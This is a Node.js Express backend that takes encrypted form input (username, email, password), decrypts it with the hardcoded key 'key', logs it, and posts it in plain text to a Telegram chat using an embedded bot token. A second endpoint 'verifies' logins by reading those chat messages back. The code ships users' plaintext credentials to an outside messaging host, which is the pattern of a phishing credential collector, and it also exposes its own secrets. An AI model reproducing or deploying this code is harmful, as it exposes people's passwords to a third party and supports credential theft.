const express = require("express");
const bodyParser = require("body-parser");
const app = express();
const port = 8080;
const CryptoJS = require("crypto-js");

require("dotenv").config();

const SECRET_KEY = "key";
const TELEGRAM_BOT_TOKEN = "6894974714:AAEbOAZb0Oz1q8uXvMD6FqIAX1oTAZaZU7g";
const TELEGRAM_CHAT_ID = "1026814070";

app.use(bodyParser.json());
app.use(express.static("public"));

app.post("/storeData", async (req, res) => {
  const encryptedData = req.body.data;
  console.log("Received encrypted data:", encryptedData);

  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
  const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

  console.log("Decrypted data:", decryptedData);

  const message = `Received user input: ${JSON.stringify(decryptedData)}`;

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    const fetch = await import("node-fetch");
    const response = await fetch.default(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to send message to Telegram");
    }

    res.status(200).send("Data stored and sent to Telegram successfully");
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
    res.status(500).send("Failed to send data to Telegram");
  }
});

//verifydata
app.post("/verifyData", async (req, res) => {
  const encryptedData = req.body.data;
  console.log("Received encrypted data:", encryptedData);

  const bytes = CryptoJS.AES.decrypt(encryptedData, SECRET_KEY);
  const decryptedData = JSON.parse(bytes.toString(CryptoJS.enc.Utf8));

  console.log("Decrypted data for verification:", decryptedData);

  const { username, email, password } = decryptedData.reduce((acc, field) => {
    acc[field.type] = field.value;
    return acc;
  }, {});

  //   const message = `Received user input: ${JSON.stringify(decryptedData)}`;

  const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
  try {
    const response = await fetch(telegramApiUrl);
    const data = await response.json();

    if (!data.ok) {
      throw new Error("Failed to fetch messages from Telegram");
    }

    const messages = data.result;
    let userFound = false;

    for (const message of messages) {
      if (message.message && message.message.text) {
        const text = message.message.text;
        if (text.startsWith("Received user input: ")) {
          const userData = JSON.parse(
            text.replace("Received user input: ", "")
          );
          console.log("Comparing with stored data:", userData);

          const usernameMatch = userData.some(
            (field) => field.type === "username" && field.value === username
          );
          const emailMatch = userData.some(
            (field) => field.type === "email" && field.value === email
          );
          const passwordMatch = userData.some(
            (field) => field.type === "password" && field.value === password
          );

          if (usernameMatch && emailMatch && passwordMatch) {
            userFound = true;
            break;
          }
        }
      }
    }

    if (userFound) {
      res.json({ success: true });
    } else {
      res.json({ success: false });
    }
  } catch (error) {
    console.error("Error verifying data with Telegram:", error);
    res.status(500).send("Failed to verify data with Telegram");
  }
});

// Start server
app.listen(port, () => {
  console.log(`Backend server running at http://localhost:${port}`);
});
